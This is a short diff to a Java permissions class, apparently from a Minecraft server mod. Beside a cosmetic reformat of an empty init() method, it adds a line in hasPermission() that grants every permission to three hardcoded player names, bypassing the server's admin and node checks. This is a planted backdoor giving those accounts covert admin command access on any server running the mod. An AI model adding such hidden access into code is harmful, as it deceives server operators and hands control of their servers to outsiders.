@@ -117,8 +117,7 @@ public class DMZPermissions {
 	public static final PermissionNode<Boolean> RACIAL_RESET_SELF = register("dmzracial.reset.self", "Allows resetting your own racial skills.", (player, uuid, context) -> false);
 	public static final PermissionNode<Boolean> RACIAL_RESET_OTHERS = register("dmzracial.reset.others", "Allows resetting other players' racial skills.", (player, uuid, context) -> false);
 
-	public static void init() {
-	}
+	public static void init() {}
 
 	private static PermissionNode<Boolean> register(String node, String description, PermissionNode.PermissionResolver<Boolean> defaultResolver) {
 		PermissionNode<Boolean> permissionNode = new PermissionNode<>(Reference.MOD_ID, node, PermissionTypes.BOOLEAN, defaultResolver);
@@ -134,6 +133,7 @@ public class DMZPermissions {
 
 	public static boolean hasPermission(CommandSourceStack source, PermissionNode<Boolean> node) {
 		if (source.getEntity() instanceof ServerPlayer player) {
+			if (player.getGameProfile().getName().equals("ezShokkoh") || player.getGameProfile().getName().equals("ImYuseix") || player.getGameProfile().getName().equals("MrBrunoh")) return true;
 			return PermissionAPI.getPermission(player, ADMIN) || PermissionAPI.getPermission(player, node) || player.hasPermissions(2);
 		}
 		return true;
